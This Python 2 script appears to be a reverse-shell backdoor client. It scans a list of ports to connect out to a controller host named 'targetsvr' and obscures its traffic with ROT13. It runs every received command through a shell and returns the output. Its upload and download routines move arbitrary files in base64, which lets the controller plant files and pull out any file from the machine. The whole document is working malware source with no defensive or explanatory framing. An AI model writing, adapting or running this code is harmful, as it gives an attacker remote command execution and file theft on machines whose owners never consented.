#!/usr/bin/env python

import socket as bulb
import time
import subprocess as subway

ports = [21,22,80,443,8000]
server = "targetsvr"

def upload(mysocket):
    mysocket.send("UPCMD: What is the name of the file you are uploading?:\n".encode("rot13"))
    fname = mysocket.recv(1024).decode("rot13")
    mysocket.send("UPCMD: What unique string will end the transmission?:\n".encode("rot13"))
    endoffile = mysocket.recv(1024).decode("rot13")
    print endoffile
    mysocket.send(
        "UPCMD: Transmit the file as a base64 encoded string followed by the end of transmission string.\n".encode("rot13"))
    data = ""
    while not data.endswith(endoffile):
        data += mysocket.recv(10240).decode("rot13")
        print data
    try:
        fh = open(fname.strip(), "w")
        fh.write(data[:-len(endoffile)].decode("base64"))
        fh.close()
    except:
        mysocket.send("Unable to create file ".encode("rot13") + fname.encode("rot13") + " UP3ND\n".encode("rot13"))
    else:
        mysocket.send(fname.encode("rot13") + " successfully uploaded UP3ND\n".encode("rot13"))


def download(mysocket):
    mysocket.send("What file do you want (including path)?:\n".encode("rot13"))
    fname = mysocket.recv(1024).decode("rot13")
    mysocket.send(
        "Receive a base64 encoded string containing your file will end with !EOF!\n".encode("rot13"))
    try:
        data = open(fname.strip()).read().encode("base64")
    except:
        data = "File " + fname + " not found\n"
    mysocket.sendall(data.encode("rot13") + "!EOF!".encode("rot13"))


def ScanAndConnect():
    print "it started"
    connected = False
    while not connected:
        for port in ports:
            time.sleep(1)
            try:
                print "Trying", port,

                mysocket.connect((server, port))
            except bulb.error:
                print "Nope"
                continue
            else:
                print "Connected"
                mysocket.send("What is thy bidding my master?\n".encode("rot13"))
                connected = True
                break

mysocket = bulb.socket()
ScanAndConnect()
while True:
    try:
        commandrequested = mysocket.recv(1024).decode("rot13")
        if len(commandrequested) == 0:
            time.sleep(3)
            mysocket = bulb.socket()
            ScanAndConnect()
            continue
        if commandrequested[:4] == "QU1T":
            mysocket.send("Terminating C0nnection.".decode("rot13"))
            break
        if commandrequested[:6] == "UPL0AD":
            upload(mysocket)
            continue
        if commandrequested[:8] == "DOWNL0AD":
            download(mysocket)
            continue
        handlethat = subway.Popen(
            commandrequested,  shell=True, stdout=subway.PIPE, stderr=subway.PIPE, stdin=subway.PIPE)
        handlethat.wait()
        results = handlethat.stdout.read() + handlethat.stderr.read()
        mysocket.send(results.encode("rot13"))
    except bulb.error:
        break
    except Exception as e:
        mysocket.send(str(e))
        break
